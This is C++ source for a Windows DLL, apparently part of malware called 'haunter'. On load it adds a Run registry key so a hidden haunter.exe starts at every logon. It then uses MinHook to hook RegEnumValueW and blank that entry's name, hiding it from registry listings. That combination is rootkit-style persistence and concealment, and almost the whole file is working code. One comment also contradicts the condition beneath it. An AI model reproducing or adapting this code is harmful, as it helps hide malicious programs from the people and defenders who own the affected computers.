#include "config.hpp"

bool CreateRegistryKey()
{
    const wchar_t* keyName = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const wchar_t* valueName = L"haunter";

    // Construir o caminho completo para o executável
    std::wstring haunterPath = PathHide;
    haunterPath += L"haunter.exe";

    // Verificar se o arquivo existe
    if (PathFileExists(haunterPath.c_str()) != FALSE) {
        // O arquivo não existe, então não criaremos a chave do Registro
            // Abrir ou criar a chave do Registro
            HKEY hKey;
            LONG result = RegCreateKeyEx(HKEY_CURRENT_USER, keyName, 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr);

            if (result != ERROR_SUCCESS)
            {
                return false;
            }

            // Definir o valor da chave do Registro com o caminho para o executável
            result = RegSetValueEx(hKey, valueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(haunterPath.c_str()), (haunterPath.size() + 1) * sizeof(wchar_t));

            RegCloseKey(hKey);

            return result == ERROR_SUCCESS;
    }
}



typedef LSTATUS(WINAPI* PREG_ENUM_VALUEW)(
    HKEY    hKey,
    DWORD   dwIndex,
    LPWSTR  lpValueName,
    LPDWORD lpcchValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE  lpData,
    LPDWORD lpcbData
    );

PREG_ENUM_VALUEW Original_RegEnumValueW;

LSTATUS WINAPI Hooked_RegEnumValueW(
    HKEY    hKey,
    DWORD   dwIndex,
    LPWSTR  lpValueName,
    LPDWORD lpcchValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE  lpData,
    LPDWORD lpcbData
)
{
    LSTATUS result = Original_RegEnumValueW(hKey, dwIndex, lpValueName, lpcchValueName, lpReserved, lpType, lpData, lpcbData);
    if (result == ERROR_SUCCESS && lpValueName && lstrcmp(lpValueName, L"haunter") == 0)
    {
        lstrcpy(lpValueName, L"");
    }

    return result;
}

bool set_reg_enum_value_hook()
{
    HMODULE hAdvApi32 = GetModuleHandle(L"advapi32.dll");

    if (!hAdvApi32)
        return false;

    Original_RegEnumValueW = (PREG_ENUM_VALUEW)GetProcAddress(hAdvApi32, "RegEnumValueW");

    if (MH_Initialize() != MH_OK)
        return false;

    if (MH_CreateHook(Original_RegEnumValueW, &Hooked_RegEnumValueW, (LPVOID*)&Original_RegEnumValueW) != MH_OK)
        return false;

    if (MH_EnableHook(Original_RegEnumValueW) != MH_OK)
        return false;

    return true;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        if (!CreateRegistryKey())
        {
            return FALSE;
        }
        if (!set_reg_enum_value_hook())
        {
            return FALSE;
        }
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}